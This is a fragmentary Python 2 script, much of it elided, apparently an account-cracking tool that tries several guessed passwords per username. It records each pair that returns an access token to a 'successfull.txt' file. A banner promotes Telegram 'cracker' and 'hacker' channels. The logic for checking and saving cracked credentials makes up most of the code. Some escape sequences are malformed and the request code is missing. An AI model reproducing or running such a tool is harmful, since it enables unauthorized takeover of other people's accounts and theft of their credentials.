...
******************************************
\x1b[1;71.m cd be :@kak_shex1
\033[21;1m canal1:https://t.me/KURDxCRAKER
 \x1b[1;76m canal2:https://t.me/KURDxHACKER
 \033[21;1m canal3:https://t.me/KURDGAMING64
*******************************************
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[OK-YADA]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK-YADA]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK-YADA]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK-YADA]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK-hak]\x1b[1;92m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK-hak]\x1b[1;92m ' + k + c + user + ' >>> ' + pass6 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
